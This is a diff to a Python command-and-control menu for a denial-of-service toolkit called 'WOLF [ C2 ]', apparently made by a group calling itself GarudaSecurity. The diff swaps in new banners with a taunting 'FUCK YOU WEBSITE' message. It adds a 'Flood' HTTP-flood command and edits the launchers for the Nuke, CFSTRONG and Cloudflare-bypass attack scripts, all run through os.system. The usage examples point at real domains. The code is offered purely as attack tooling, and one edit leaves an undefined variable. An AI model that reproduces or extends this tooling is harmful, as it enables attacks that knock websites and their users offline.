@@ -102,15 +102,21 @@ def rules():
 def layer7():
     clear()
     print("""
-               \033[37m           ,MMM\033[35m8&&&.
-               \033[37m      _...MMMMM\033[35m88&&&&..._
-               \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.
-               \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::
-               \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
-               \033[37m     `''''MMMMM\033[35m88&&&&''''`
-               \033[37m           'MMM\033[35m8&&&'
-               
-                     \033[37mTools By GarudaSecurity
+  ▄████  ▄▄▄       ██▀███    ██████ ▓█████  ▄████▄  
+ ██▒ ▀█▒▒████▄    ▓██ ▒ ██▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
+▒██░▄▄▄░▒██  ▀█▄  ▓██ ░▄█ ▒░ ▓██▄   ▒███   ▒▓█    ▄ 
+░▓█  ██▓░██▄▄▄▄██ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
+░▒▓███▀▒ ▓█   ▓██▒░██▓ ▒██▒▒██████▒▒░▒████▒▒ ▓███▀ ░
+ ░▒   ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
+  ░   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   
+░ ░   ░   ░   ▒     ░░   ░ ░  ░  ░     ░   ░        
+      ░       ░  ░   ░           ░     ░  ░░ ░      
+                                           ░        
+                  
+                  \033[35mMy Team: GARUDA SECURITY
+      \033[37mWelcome: Tools DOS By GarudaSecurity & Reroatzx - 777
+          \033[34mMessage Me: FUCK YOU WEBSITE🖕🖕
+       ]-------------------------------------[
 
 [ LAYER - 4 ] 
 
@@ -154,6 +160,7 @@ def layer7():
 – .CFSTRONG : Attack very strongly
 – .Null : Attack with url and port 443 80
 – .Nuke : Attack power max🖕
+– .Flood : http flood attack test🖕💀
 """)
 
 def exit_program():
@@ -167,17 +174,28 @@ def menu():
     clear()
     print("""
 
-Welcome - WOLF [ C2 ].
-Founded By Reroatzx - 777 X AgenTranSom666
-Version, 1.2
-2023 - 2024
-\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " 𝓶𝓮𝓽𝓱𝓸𝓭𝓼 " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
+  ▄████  ▄▄▄       ██▀███    ██████ ▓█████  ▄████▄  
+ ██▒ ▀█▒▒████▄    ▓██ ▒ ██▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
+▒██░▄▄▄░▒██  ▀█▄  ▓██ ░▄█ ▒░ ▓██▄   ▒███   ▒▓█    ▄ 
+░▓█  ██▓░██▄▄▄▄██ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
+░▒▓███▀▒ ▓█   ▓██▒░██▓ ▒██▒▒██████▒▒░▒████▒▒ ▓███▀ ░
+ ░▒   ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
+  ░   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   
+░ ░   ░   ░   ▒     ░░   ░ ░  ░  ░     ░   ░        
+      ░       ░  ░   ░           ░     ░  ░░ ░      
+                                           ░        
+ \033[38mWelcome - WOLF [ C2 ].             
+                      
+                  \033[35mMy Team: GARUDA SECURITY
+      \033[37mWelcome: Tools DOS By GarudaSecurity & Reroatzx - 777
+          \033[34mMessage Me: FUCK YOU WEBSITE🖕🖕
 """)
 
 def main():
     menu()
     while(True):
-        cnc = input('''\033[0;30;45mroot @ WOLF\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m''')
+        cnc = input('''\033[0;30;45m?┌──(root㉿WOLF)-[/ATTACK]
+└─#\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m''')
         if cnc == "method" or cnc == "methods" or cnc == "METHODS" or cnc == "METHOD":
             layer7()
         elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
@@ -200,6 +218,19 @@ def main():
             except IndexError:
                 print('Usage: udpbypass <ip> <port>')
                 print('Example: udpbypass 1.1.1.1 80')
+               
+        elif "Flood" in cnc:
+            try:
+                url = cnc.split()[1]
+                threads = cnc.split()[2]
+                methode = cnc.split()[3]
+                time = cnc.split()[4]
+                header = cnc.split()[5]
+                os.system(f'go run httpflood.go {url} {threads} {methode} {time} {header}')
+            except IndexError:
+                print('Example: Flood https://bojep.com/ 5000 get 120 ua.txt')
+                print('example²: Flood <url> <threads> <get/post> <time> <ua.txt>')
+                
                 
         elif "Nuke" in cnc:
             try:
@@ -208,7 +239,7 @@ def main():
                threads = cnc.split()[3]
                proxy = cnc.split()[4]
                rps = cnc.split()[5]
-               os.system(f'node Nuke.js {ur} {time} {threads} {proxy} {rps}')
+               os.system(f'node Nuke.js {url} {time} {threads} {proxy} {rps}')
             except IndexError:
                 print('Example Nuke http://bokep.com/ 120 20000 proxies.txt 1000')
                 print('Example² Nuke <url> <time> <threads> <proxies.txt> <rps>')
@@ -221,10 +252,10 @@ def main():
                 method = cnc.split()[4]
                 proxy = cnc.split()[5]
                 requests = cnc.split()[6]
-                os.system(f'node CFSTRONG.js {url} {time} {threads} {method} {proxy} {requests}')
+                os.system(f'node CFSTRONG.js {url} {time} {threads} {method} {proxy} {request}')
             except IndexError:
                 print('Usage: CFSTRONG https://yandex.com/ 120 15000 GET/POST proxies.txt 500')
-                print('Example: CFSTRONG <url> <time> <threads> <methode> <proxy> <requests>')
+                print('Example CFSTRONG <url> <time> <threads> <methode> <proxy> <request>')
         
         elif "tcp-killer" in cnc:
             try:
@@ -582,12 +613,11 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                thread = cnc.split()[3]
                 ascii_vro()
-                os.system(f'node cf.js {url} {time} {thread}')
+                os.system(f'node BYPASS.js {url} {time}')
             except IndexError:
-                print('Usage: cf-bypass <url> <time> <threads>')
-                print('Example: cf-bypass http://example.com 60 1250')
+                print('Usage: cf-bypass <url> <time>')
+                print('Example: cf-bypass http://example.com 60')
 
         elif "uambypass" in cnc:
             try:
